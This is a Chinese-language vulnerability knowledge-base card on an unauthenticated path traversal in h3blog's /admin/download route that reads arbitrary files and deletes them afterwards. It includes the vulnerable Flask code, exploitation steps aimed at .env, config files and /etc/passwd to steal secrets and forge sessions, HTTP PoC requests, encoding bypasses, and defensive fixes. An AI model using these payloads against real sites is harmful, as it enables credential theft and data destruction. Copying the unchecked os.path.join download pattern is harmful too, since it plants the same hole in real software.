---
id: web-python-framework-h3blog-download-path-traversal-file-read-delete
title: h3blog /admin/download 无鉴权路径穿越：fileName 逃逸 uploads 任意文件读取并在下载后删除
type: scenario
domain: web
path: web/python/framework
technique: h3blog-download-filename-path-traversal-read-delete
tags:
- python
- flask
- h3blog
- path-traversal
- arbitrary-file-read
- arbitrary-file-delete
- unauthorized
- file-download
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V237
  verified_at: '2026-11-07T09:20:19+08:00'
  notes: 已对照原文核对（36 图）；原文实测读取并删除 111.txt，PoC 一致；未复现。
url: /docs/web/python/framework/web-python-framework-h3blog-download-path-traversal-file-read-delete/
draft: false
kb_aliases:
- h3blog 任意文件读取
- h3blog 任意文件删除
- os.path.join 路径穿越
- admin/download fileName
- 下载后删除文件
- H3BLOG_UPLOAD_PATH
---

## 一句话结论

h3blog 的 `/admin/download` 路由没有 `@login_required`/`@admin_required` 等任何权限注解，直接把请求参数 `fileName` 与 `H3BLOG_UPLOAD_PATH`（项目根目录/uploads）做 `os.path.join` 后 `open()` 读取，并以流式响应返回；`../../../../111.txt` 可逃逸到项目外任意读取文件，且 `stream_and_remove_file()` 在响应结束后调用 `os.remove(file_path)`，把刚读的文件删除——未授权即可任意文件读取，并附带任意文件删除副作用。

## 原理

- **路由无鉴权**：`download()` 定义在 `app/admin/views/common.py`，虽然位于 admin 蓝图，但没有加 `@login_required` 或 `@admin_required`，Flask 路由装饰器只注册 URL，不继承蓝图级的登录保护；因此未登录即可访问。
- **路径拼接未限制**：`file_path = os.path.join(current_app.config['H3BLOG_UPLOAD_PATH'], fileName)`，`H3BLOG_UPLOAD_PATH = os.path.join(basedir, 'uploads')`。`os.path.join` 不会把结果限制在 base 下：`fileName=../../../../111.txt` 会逐级上跳；如果 `fileName` 以 `/`（Linux）或盘符/`\`（Windows）开头，`os.path.join` 会直接丢弃 base，返回绝对路径。
- **未做规范化校验**：代码没有 `os.path.abspath`/`realpath` + `commonpath`/`startswith` 校验，也没有 `secure_filename`、扩展名白名单或 `../` 过滤。
- **读取即删除**：`stream_and_remove_file()` 先 `yield from file_handle`、关闭文件，再 `os.remove(file_path)`；下载成功的同时原文件被删除。读取权限与删除权限都继承 Flask 进程用户，通常可读 `.env`、配置文件、源码、日志、数据库文件等。
- **响应头泄露文件名**：`Content-Disposition` 使用 `pathlib.Path(fileName).name`，会暴露读取到的文件名；响应正文即文件内容。

## 触发条件

- 目标运行 h3blog（Flask 博客系统），`/admin/download` 路由可访问。
- 攻击者知道或能猜测目标文件的相对/绝对路径；Linux 下可用 `/etc/passwd` 绝对路径，Windows 下可用 `C:\Windows\win.ini` 或 `..\..\`。
- Flask 进程对目标文件有读权限；删除副作用需要写权限（通常与读权限同源）。
- 无需登录、无需 CSRF token、无需管理员权限。

## 利用步骤

1. 确认 `/admin/download` 可访问且未跳转登录。
2. 构造 `fileName`：
   - 相对穿越：`../../../../111.txt`、`../../.env`、`../../app/config.py`；
   - 绝对路径：Linux `/etc/passwd`，Windows `C:\Windows\win.ini`（`os.path.join` 遇到绝对路径会忽略 base）。
3. 发送 `GET /admin/download?fileName=<payload>`，读取响应正文。
4. 注意响应完成后目标文件会被删除；若要保留证据，先另存响应正文，且避免对关键文件（如数据库、源码）反复请求。
5. 从 `.env`/配置中获取 `DATABASE_URL`、Flask `SECRET_KEY`、第三方支付/邮件密钥等，进一步登录数据库或伪造 session。
6. 若需确认删除副作用，可在可写目录创建测试文件后请求并检查文件是否消失。

## PoC

```http
GET /admin/download?fileName=../../../../111.txt HTTP/1.1
Host: 127.0.0.1:5000
Accept: */*
User-Agent: Mozilla/5.0
```

响应为 `200 OK`，`Content-Disposition: attachment; filename=111.txt`，正文为文件内容；随后 `111.txt` 被删除。

绝对路径变体：

```http
GET /admin/download?fileName=C:\Windows\win.ini HTTP/1.1
GET /admin/download?fileName=/etc/passwd HTTP/1.1
```

关键代码（原文）：

```python
@admin.get('/download')
def download():
    fileName = request.values.get('fileName', '')
    file_path = os.path.join(current_app.config['H3BLOG_UPLOAD_PATH'], fileName)
    file_handle = open(file_path, 'rb')
    ...
    def stream_and_remove_file():
        yield from file_handle
        file_handle.close()
        os.remove(file_path)
    return current_app.response_class(stream_and_remove_file(), ...)
```

## 变体与关联

- 路径穿越编码：`%2e%2e%2f`、`..%5c`、双重编码、Unicode 归一化，绕过简单的 `../` 过滤（本路由没有过滤，直接明文即可）。
- 绝对路径：`os.path.join` 在第二个参数为绝对路径时丢弃 base，是 Python 路径拼接的常见陷阱；同类问题也出现在上传、导出、模板加载。
- 删除副作用可升级为破坏性影响：删除应用源码/模板/配置可使站点不可用；本卡聚焦任意读取，删除作为副作用记录（单纯 DoS 不作为独立场景）。
- 关联 [[web-python-framework-flask-static-folder-arbitrary-file-read]]（Flask 静态目录任意读）、[[web-python-framework-astrbot-cve-2025-48957-get-file-auth-bypass-path-traversal]]（鉴权绕过 + 路径穿越）。
- 与 h3blog 其他问题组合：读取 `.env` 获得 SECRET_KEY 后可伪造 session；结合后台代码生成 RCE 可进一步接管。

## 检测与防御

- 该路由加登录与管理员权限校验，下载接口不应匿名开放。
- 路径必须规范化并限制在 base 目录内：`base = os.path.realpath(upload_dir)`，`target = os.path.realpath(os.path.join(base, fileName))`，校验 `os.path.commonpath([base, target]) == base`；拒绝绝对路径与 `..`。
- 使用 `secure_filename`/白名单扩展名，禁止下载任意文件；不要用用户输入直接 `open`。
- 下载后不要 `os.remove` 原文件；如需一次性下载，使用临时副本并清理临时文件。
- 最小权限运行 Flask 进程，限制其对源码、配置、数据库文件的读权限；敏感配置使用环境变量/密钥管理，不落盘到可读路径。
- 日志/IDS 检测 `fileName` 含 `../`、绝对路径、`%2e`、`..%5c` 的请求，以及同一 IP 对 `/admin/download` 的批量路径探测。
